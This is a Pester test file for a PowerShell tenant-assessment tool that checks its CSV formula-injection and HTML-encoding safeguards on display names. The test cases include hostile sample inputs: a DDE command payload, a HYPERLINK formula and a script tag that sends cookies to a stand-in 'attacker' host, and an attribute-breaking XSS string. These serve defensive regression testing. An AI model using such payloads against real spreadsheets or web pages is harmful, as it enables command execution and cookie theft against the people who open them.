#Requires -Version 7.0
#Requires -Modules Pester

# Covers the two output-sanitization controls.
#
# Both exist for the same reason: directory display names are attacker-influenceable in
# any tenant that permits self-service profile edits or B2B invites, and this tool's
# whole output is files that somebody else opens: a manager in Excel, a client in a
# browser. These are the regression tests for controls whose failure is silent.

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    . (Import-ScriptFunction -Path (Get-AssessmentScriptPath) -Name @(
            'Protect-CsvInjection'
            'ConvertTo-SafeHtml'
        ))
}

Describe 'Protect-CsvInjection' {

    Context 'Formula-triggering leading characters' {

        $dangerous = @(
            @{ Value = '=cmd|''/c calc''!A1'; Label = 'equals (DDE payload)' }
            @{ Value = '=HYPERLINK("http://attacker/","Click")'; Label = 'equals (exfil hyperlink)' }
            @{ Value = '+1234567890'; Label = 'plus' }
            @{ Value = '-1+1'; Label = 'minus' }
            @{ Value = '@SUM(A1:A9)'; Label = 'at' }
            @{ Value = "`tSomething"; Label = 'tab' }
            @{ Value = "`rSomething"; Label = 'carriage return' }
        )

        It 'neutralises a display name starting with <Label>' -TestCases $dangerous {
            $result = [PSCustomObject]@{ DisplayName = $Value } | Protect-CsvInjection

            $result.DisplayName | Should -BeExactly ("'" + $Value)
        }
    }

    Context 'Values that must be left alone' {

        It 'does not touch an ordinary display name' {
            $result = [PSCustomObject]@{ DisplayName = 'Rowan Ellis' } | Protect-CsvInjection
            $result.DisplayName | Should -BeExactly 'Rowan Ellis'
        }

        It 'does not touch a UPN' {
            $result = [PSCustomObject]@{ UserPrincipalName = 'rowan.ellis@contoso.com' } | Protect-CsvInjection
            $result.UserPrincipalName | Should -BeExactly 'rowan.ellis@contoso.com'
        }

        It 'does not touch a name that merely contains a dangerous character later on' {
            $result = [PSCustomObject]@{ DisplayName = 'Ellis=Rowan' } | Protect-CsvInjection
            $result.DisplayName | Should -BeExactly 'Ellis=Rowan'
        }

        It 'leaves booleans as booleans so the CSV keeps its types' {
            $result = [PSCustomObject]@{ IsAdmin = $true } | Protect-CsvInjection
            $result.IsAdmin | Should -BeOfType [bool]
            $result.IsAdmin | Should -BeTrue
        }

        It 'leaves an empty string alone' {
            $result = [PSCustomObject]@{ PhoneMethodsRegistered = '' } | Protect-CsvInjection
            $result.PhoneMethodsRegistered | Should -BeExactly ''
        }

        It 'leaves nulls alone' {
            $result = [PSCustomObject]@{ RegistrationReportLastUpdatedUtc = $null } | Protect-CsvInjection
            $result.RegistrationReportLastUpdatedUtc | Should -BeNullOrEmpty
        }
    }

    Context 'Shape of the output' {

        It 'preserves property order, because column order is the report layout' {
            $row = [PSCustomObject][ordered]@{
                Risk = 'Critical'; Reason = 'because'; DisplayName = 'Rowan Ellis'; UserId = 'abc'
            }

            $result = $row | Protect-CsvInjection

            $result.PSObject.Properties.Name | Should -Be @('Risk', 'Reason', 'DisplayName', 'UserId')
        }

        It 'processes every row of a collection' {
            $rows = @(
                [PSCustomObject]@{ DisplayName = '=EVIL()' }
                [PSCustomObject]@{ DisplayName = 'Safe Name' }
                [PSCustomObject]@{ DisplayName = '@ALSO_EVIL()' }
            )

            $result = @($rows | Protect-CsvInjection)

            $result.Count | Should -Be 3
            $result[0].DisplayName | Should -BeExactly "'=EVIL()"
            $result[1].DisplayName | Should -BeExactly 'Safe Name'
            $result[2].DisplayName | Should -BeExactly "'@ALSO_EVIL()"
        }

        It 'guards every string property, not just the first' {
            $row = [PSCustomObject][ordered]@{
                DisplayName = '=A1'; Reason = '+B2'; UserPrincipalName = 'fine@contoso.com'
            }

            $result = $row | Protect-CsvInjection

            $result.DisplayName | Should -BeExactly "'=A1"
            $result.Reason | Should -BeExactly "'+B2"
            $result.UserPrincipalName | Should -BeExactly 'fine@contoso.com'
        }
    }
}

Describe 'ConvertTo-SafeHtml' {

    It 'encodes a script tag in a display name' {
        $encoded = ConvertTo-SafeHtml '<script>fetch("http://attacker/"+document.cookie)</script>'

        $encoded | Should -Not -Match '<script'
        $encoded | Should -Match '&lt;script&gt;'
    }

    It 'encodes an attribute-breaking payload' {
        $encoded = ConvertTo-SafeHtml '" onmouseover="alert(1)'

        $encoded | Should -Not -Match '(?<!&quot;)"'
        $encoded | Should -Match '&quot;'
    }

    It 'encodes ampersands so entities cannot be smuggled through' {
        ConvertTo-SafeHtml '&lt;script&gt;' | Should -Be '&amp;lt;script&amp;gt;'
    }

    It 'returns an empty string for null rather than the word null' {
        ConvertTo-SafeHtml $null | Should -BeExactly ''
    }

    It 'renders non-string values as their string form' {
        ConvertTo-SafeHtml 42 | Should -BeExactly '42'
        ConvertTo-SafeHtml $true | Should -BeExactly 'True'
    }

    It 'leaves an ordinary name readable' {
        ConvertTo-SafeHtml 'Rowan Ellis' | Should -BeExactly 'Rowan Ellis'
    }

    It "encodes an apostrophe in a name to an entity that still renders as an apostrophe" {
        # O'Brien is a real name and appears in real tenants. HtmlEncode emits &#39;,
        # which a browser renders as an apostrophe, so the client report stays readable
        # while the character cannot break out of a single-quoted attribute.
        ConvertTo-SafeHtml "Niamh O'Brien" | Should -BeExactly 'Niamh O&#39;Brien'
    }
}
